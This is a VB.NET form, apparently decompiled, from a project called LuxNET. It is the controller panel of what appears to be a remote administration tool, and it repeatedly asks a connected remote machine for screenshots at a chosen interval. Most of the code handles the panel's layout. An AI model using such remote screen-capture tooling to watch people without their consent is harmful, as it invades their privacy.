Imports LuxNET.My.Resources
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Drawing2D
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports LuxNET.LuxNET

Public Class ScreenshotManager
    Public Sub New()
        Me.packer = New LuxNET.Pack
        Me.t = New Timer
        Me.InitializeComponent()
    End Sub

    Private Sub btn_start_Click(sender As Object, e As EventArgs) Handles btn_start.Click
        Me.SendPacket(New Object() {CByte(&H6B), Conversions.ToLong(Me.ComboBox2.SelectedItem), (Conversions.ToInteger(Me.ComboBox1.SelectedItem) - 1)})
        Me.t.Interval = Convert.ToInt32(Me.NumericUpDown1.Value)
        Me.t.Start()
        Me.btn_start.Enabled = False
        Me.btn_Stop.Enabled = True
    End Sub


    Private Sub btn_Stop_Click(sender As Object, e As EventArgs) Handles btn_Stop.Click
        Me.t.Stop()
        Me.btn_start.Enabled = True
        Me.btn_Stop.Enabled = False
    End Sub

    Private Sub NumericUpDown1_ValueChanged(sender As Object, e As EventArgs) Handles NumericUpDown1.ValueChanged
        Me.t.Interval = Convert.ToInt32(Me.NumericUpDown1.Value)
    End Sub

    Private Sub Panel1_Click(sender As Object, e As EventArgs) Handles Panel1.Click
        Dim point2 As Point
        If Not Me.ausgefahren Then
            Me.Panel2.Visible = True
            point2 = New Point(CInt(Math.Round(CDbl(((CDbl(Me.Size.Width) / 2) - (CDbl(Me.Panel1.Size.Width) / 2))))), &H2F)
            Me.Panel1.Location = point2
            Me.Panel1.BackgroundImage = My.Resources.arrow_090
            Me.ausgefahren = True
        Else
            Me.Panel1.BackgroundImage = My.Resources.arrow_270
            point2 = New Point(CInt(Math.Round(CDbl(((CDbl(Me.Size.Width) / 2) - (CDbl(Me.Panel1.Size.Width) / 2))))), 0)
            Me.Panel1.Location = point2
            Me.Panel2.Visible = False
            Me.ausgefahren = False
        End If
    End Sub

    Private Sub Panel1_MouseEnter(sender As Object, e As EventArgs) Handles Panel1.MouseEnter
        Me.Panel1.BackColor = Color.LightGray
    End Sub

    Private Sub Panel1_MouseLeave(sender As Object, e As EventArgs) Handles Panel1.MouseLeave
        Me.Panel1.BackColor = SystemColors.Control
    End Sub

    Private Sub Panel2_Paint(sender As Object, e As PaintEventArgs) Handles Panel2.Paint
        Dim path As New GraphicsPath
        path.AddRectangle(Me.Panel2.DisplayRectangle)
        e.Graphics.FillPath(New SolidBrush(Color.FromArgb(&H60, &H9F, &HD0)), path)
    End Sub

    Private Sub PictureBox1_MouseMove(sender As Object, e As MouseEventArgs) Handles PictureBox1.MouseMove
        If ((((e.Location.X >= 0) And (e.Location.X <= Me.Size.Width)) And (e.Location.Y >= 0)) And (e.Location.Y <= &H19)) Then
            Me.Panel1.Visible = True
        ElseIf Not Me.ausgefahren Then
            Me.Panel1.Visible = False
        End If
    End Sub

    Private Sub ScreenshotManager_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Me.btn_Stop_Click(Nothing, Nothing)
    End Sub

    Private Sub ScreenshotManager_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.ComboBox2.Text = "45"
        Me.SendPacket(New Object() {CByte(&H6C)})
    End Sub

    Private Sub ScreenshotManager_Resize(sender As Object, e As EventArgs) Handles Me.Resize
        Dim point2 As Point
        If Me.ausgefahren Then
            point2 = New Point(CInt(Math.Round(CDbl(((CDbl(Me.Size.Width) / 2) - (CDbl(Me.Panel1.Size.Width) / 2))))), &H2F)
            Me.Panel1.Location = point2
            point2 = New Point(CInt(Math.Round(CDbl(((CDbl(Me.Size.Width) / 2) - (CDbl(Me.Panel2.Size.Width) / 2))))), 0)
            Me.Panel2.Location = point2
            point2 = New Point(CInt(Math.Round(CDbl(((CDbl(Me.Panel2.Size.Width) / 2) - (CDbl(Me.PanelItems.Size.Width) / 2))))), 3)
            Me.PanelItems.Location = point2
        Else
            point2 = New Point(CInt(Math.Round(CDbl(((CDbl(Me.Size.Width) / 2) - (CDbl(Me.Panel1.Size.Width) / 2))))), 0)
            Me.Panel1.Location = point2
            point2 = New Point(CInt(Math.Round(CDbl(((CDbl(Me.Size.Width) / 2) - (CDbl(Me.Panel2.Size.Width) / 2))))), 0)
            Me.Panel2.Location = point2
            point2 = New Point(CInt(Math.Round(CDbl(((CDbl(Me.Panel2.Size.Width) / 2) - (CDbl(Me.PanelItems.Size.Width) / 2))))), 3)
            Me.PanelItems.Location = point2
        End If
    End Sub
    Private Sub SendPacket(ByVal ParamArray args As Object())
        Dim data As Byte() = Me.packer.Serialize(args)
        Me.client.Send(data)
    End Sub

    Private Sub t_Tick(sender As Object, e As EventArgs) Handles t.Tick
        Me.SendPacket(New Object() {CByte(&H6B), Conversions.ToLong(Me.ComboBox2.SelectedItem), (Conversions.ToInteger(Me.ComboBox1.SelectedItem) - 1)})
    End Sub

    Private ausgefahren As Boolean
    Public client As ServerClient
    Private packer As LuxNET.Pack

    ' Nested Types
    Public Enum PacketHeaders As Byte
        ' Fields
        GetScreenshot = &H6B
        MonitorCount2 = &H6C
    End Enum
End Class